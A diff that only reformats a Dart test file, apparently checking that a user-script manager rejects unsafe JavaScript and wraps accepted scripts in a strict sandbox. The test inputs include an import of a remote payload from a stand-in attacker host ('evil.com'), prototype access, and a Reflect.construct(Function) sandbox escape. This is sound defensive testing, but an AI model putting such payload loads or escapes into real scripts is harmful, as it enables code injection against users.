@@ -184,12 +184,14 @@ void main() {
         throwsA(isA<Exception>()),
       );
       expect(
-        () => manager.add(script0(code: 'import("http://evil.com/payload.js")')),
+        () =>
+            manager.add(script0(code: 'import("http://evil.com/payload.js")')),
         throwsA(isA<Exception>()),
       );
     });
 
-    test('rejects unicode-escaped keywords like \\u0065val and \\u0046unction', () async {
+    test('rejects unicode-escaped keywords like \\u0065val and \\u0046unction',
+        () async {
       final manager = UserScriptManager.instance;
       await manager.load();
 
@@ -216,7 +218,8 @@ void main() {
         throwsA(isA<Exception>()),
       );
       expect(
-        () => manager.add(script0(code: 'const p = Object.getPrototypeOf({});')),
+        () =>
+            manager.add(script0(code: 'const p = Object.getPrototypeOf({});')),
         throwsA(isA<Exception>()),
       );
     });
@@ -226,7 +229,8 @@ void main() {
       await manager.load();
 
       expect(
-        () => manager.add(script0(code: 'Reflect.construct(Function, ["alert(1)"])')),
+        () => manager
+            .add(script0(code: 'Reflect.construct(Function, ["alert(1)"])')),
         throwsA(isA<Exception>()),
       );
       expect(
@@ -235,10 +239,13 @@ void main() {
       );
     });
 
-    test('generated sandbox wraps in strict IIFE with prototype freezes and 5s timeout', () async {
+    test(
+        'generated sandbox wraps in strict IIFE with prototype freezes and 5s timeout',
+        () async {
       final manager = UserScriptManager.instance;
       await manager.load();
-      await manager.add(script0(pattern: '*', code: 'console.log("safe script");'));
+      await manager
+          .add(script0(pattern: '*', code: 'console.log("safe script");'));
 
       final js = await manager.getJsForUrl('https://example.com');
       expect(js, contains("'use strict'"));
@@ -253,4 +260,3 @@ void main() {
     });
   });
 }
-
